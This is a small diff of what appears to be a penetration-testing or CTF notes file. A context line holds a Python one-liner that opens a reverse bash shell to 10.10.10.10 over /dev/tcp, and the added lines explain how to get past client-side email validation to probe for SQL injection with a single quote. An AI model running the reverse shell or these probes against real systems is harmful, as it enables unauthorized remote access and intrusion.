@@ -13,3 +13,6 @@ Try `zless` or `zcat`.
 ```
 import os; os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.10.10/8080 0>&1\"'
 ```
+
+### In what way can you try to trip up a web form that uses html tags in order to check syntax?
+As an example case with `<input ... type='email'>`, you can inspect the tag and change the type to `text` and try submitting a single quote (`'`).
